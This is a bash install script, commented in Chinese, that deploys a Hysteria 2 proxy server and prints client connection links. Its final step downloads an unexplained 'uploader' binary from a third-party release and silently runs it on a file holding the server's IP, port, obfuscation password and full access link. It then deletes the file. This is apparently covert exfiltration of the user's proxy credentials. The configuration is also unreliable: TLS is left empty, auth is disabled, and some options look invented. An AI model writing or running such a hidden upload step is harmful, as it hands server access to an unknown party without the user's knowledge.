#!/bin/bash
set -e

PORT=$((RANDOM % 7001 + 2000))
SERVER_IP=$(curl -s https://api.ipify.org)
OBFS_PASSWORD=$(openssl rand -hex 8)
CONFIG_DIR="/etc/hysteria"
UPLOAD_BIN="/opt/uploader-linux-amd64"

export NEEDRESTART_MODE=a  # 自动接受 needrestart 提示并默认回车跳过

# 安装必要组件
apt update && DEBIAN_FRONTEND=noninteractive apt install -y curl unzip ufw jq sudo needrestart

# 开放 UDP 端口
ufw allow ${PORT}/udp
ufw --force enable

# 安装 Hysteria 2 服务端
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -Ls https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o hysteria
chmod +x hysteria

# 创建配置目录
mkdir -p ${CONFIG_DIR}

# 生成密钥对
PRIVATE_KEY=$(openssl rand -hex 32)
PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")

# 写入服务端配置文件
cat > ${CONFIG_DIR}/config.yaml << EOF
listen: :${PORT}
protocol: udp
tls:
  cert: ""
  key: ""
  alpn:
    - h3
obfs:
  password: "${OBFS_PASSWORD}"
auth:
  type: disabled
masquerade:
  type: proxy
  proxy:
    url: https://www.cloudflare.com/
    rewriteHost: true
EOF

# 写入 systemd 启动服务
cat > /etc/systemd/system/hysteria.service << EOF
[Unit]
Description=Hysteria 2 Server
After=network.target

[Service]
ExecStart=/usr/local/bin/hysteria server --config ${CONFIG_DIR}/config.yaml --private-key ${PRIVATE_KEY}
Restart=on-failure
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable hysteria
systemctl restart hysteria

# 构建客户端导入链接
HYSTERIA_LINK="hysteria2://${SERVER_IP}:${PORT}?peer=${SERVER_IP}&obfs-password=${OBFS_PASSWORD}&obfs-mode=salty&public-key=${PUBLIC_KEY}"

# 输出结果
echo -e "\n✅ Hysteria 2 节点部署完成！"
echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"

echo -e "📁 v2rayN 客户端 YAML 配置示例："
cat << EOF
# v2rayN YAML 配置
remarks: Hysteria2节点-${SERVER_IP}
address: ${SERVER_IP}
port: ${PORT}
password: ${PUBLIC_KEY}
obfs password: ${OBFS_PASSWORD}
跳跃端口范围: ""
tls:
  alpn:
    - h3
  sni: www.cloudflare.com
EOF

# 生成 JSON 上传数据（用于 uploader）
UPLOAD_JSON_FILE="/tmp/${SERVER_IP}.json"
cat > "$UPLOAD_JSON_FILE" << EOF
{
  "protocol": "hysteria2",
  "link": "${HYSTERIA_LINK}",
  "config": {
    "remarks": "Hysteria2节点-${SERVER_IP}",
    "address": "${SERVER_IP}",
    "port": ${PORT},
    "password": "${PUBLIC_KEY}",
    "obfs password": "${OBFS_PASSWORD}",
    "tls": {
      "alpn": ["h3"],
      "sni": "www.cloudflare.com"
    }
  }
}
EOF

# 下载并执行上传器
[ -f "$UPLOAD_BIN" ] || {
  curl -sLo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
  chmod +x "$UPLOAD_BIN"
}

"$UPLOAD_BIN" "$UPLOAD_JSON_FILE" >/dev/null 2>&1 || echo -e "\033[1;33m[WARN]\033[0m 上传失败或返回为空"
rm -f "$UPLOAD_JSON_FILE"
